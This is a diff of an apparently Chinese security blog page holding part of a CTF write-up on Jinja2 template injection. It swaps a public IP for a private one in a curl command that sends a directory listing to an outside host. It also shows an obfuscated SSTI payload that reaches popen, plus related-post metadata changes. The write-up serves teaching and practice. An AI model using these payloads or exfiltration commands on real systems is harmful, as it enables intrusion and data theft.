@@ -641,9 +641,9 @@ for i in range(1,100):
 <p>不知道是什么问题，但是他这里反弹不了shell，最后是使用 curl 外带数据，直接外带他的数据不完整，所以先写文件再外带，这里测试的时候不知道为什么他这个网站的 curl 老是报错，比如里面不能有 <code>&quot;&quot;</code> ，导致一些我的语句用不了</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">ls &#x2F; &gt; &#x2F;tmp&#x2F;1.txt
 
-curl -X POST --data-binary @&#x2F;tmp&#x2F;1.txt http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;</code></pre>
+curl -X POST --data-binary @&#x2F;tmp&#x2F;1.txt http:&#x2F;&#x2F;192.168.11.42:8888&#x2F;</code></pre>
 
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250730175658-20260228215312-wsgm1sv.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20260325122354.png"></p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;dict(a&#x3D;a)|join|length %&#125;
 &#123;% set b&#x3D;dict(aa&#x3D;a)|join|length %&#125;
 &#123;% set c&#x3D;dict(aaa&#x3D;a)|join|length %&#125;
@@ -670,7 +670,7 @@ curl -X POST --data-binary @&#x2F;tmp&#x2F;1.txt http:&#x2F;&#x2F;101.35.151.42:
 &#123;% set code&#x3D;(lipsum|attr(glo)).get(o).popen(shell) %&#125;</code></pre>
 
 <p>这里使用命令测试太麻烦了，于是问 ai 写了一个脚本</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">code &#x3D; &#39;curl -X POST --data-binary @&#x2F;tmp&#x2F;1.txt http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;&#39;
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">code &#x3D; &#39;curl -X POST --data-binary @&#x2F;tmp&#x2F;1.txt http:&#x2F;&#x2F;192.168.11.42:8888&#x2F;&#39;
 
 mapping &#x3D; &#123;&#39;a&#39;:1,&#39;b&#39;:2,&#39;c&#39;:3,&#39;d&#39;:4,&#39;e&#39;:5,&#39;f&#39;:6,&#39;g&#39;:7,&#39;h&#39;:8,&#39;i&#39;:9,&#39;j&#39;:10,&#39;k&#39;:11&#125;
 rev &#x3D; &#123;v:k for k,v in mapping.items()&#125;
@@ -937,12 +937,12 @@ if __name__&#x3D;&#x3D;&quot;__main__&quot;:
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/05/20/ctfshow-php-te-xing/">
+                <a href="/2025/05/22/xxe/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/biasduuaasdbsa.jpg" class="responsive-img" alt="CTFSHOW-php特性">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_123907.jpg" class="responsive-img" alt="XXE">
                         
-                        <span class="card-title">CTFSHOW-php特性</span>
+                        <span class="card-title">XXE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -953,14 +953,14 @@ if __name__&#x3D;&#x3D;&quot;__main__&quot;:
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTFSHOW/" class="post-category">
-                                    CTFSHOW
+                            <a href="/categories/WEB/" class="post-category">
+                                    WEB
                                 </a>
                             
                             
@@ -974,8 +974,8 @@ if __name__&#x3D;&#x3D;&quot;__main__&quot;:
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/%E5%88%B7%E9%A2%98/">
-                        <span class="chip bg-color">刷题</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
                     </a>
                     
                 </div>
